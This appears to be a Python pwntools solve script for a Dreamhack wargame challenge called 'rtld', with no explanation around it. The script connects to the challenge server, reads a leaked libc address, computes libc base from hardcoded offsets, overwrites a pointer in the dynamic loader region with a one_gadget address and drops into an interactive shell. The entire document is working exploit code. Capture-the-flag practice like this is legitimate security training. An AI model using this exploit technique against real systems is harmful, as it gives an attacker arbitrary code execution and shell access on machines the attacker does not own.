#!/usr/bin/python 
from pwn import *

#p = process("./rtld")
p = remote("host1.dreamhack.games", 8246)
elf = ELF("./rtld")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p.recvuntil(": ")
libcBase = int(p.recv(14), 16) - 0x3c5620
log.info("libcBase : "+hex(libcBase))
rtld = libcBase + 0x5f0f48
one_gadget = libcBase + 0xf1147

#gdb.attach(p)

p.sendlineafter("addr: ", str(rtld))
p.sendlineafter("value: ", str(one_gadget))

p.interactive()


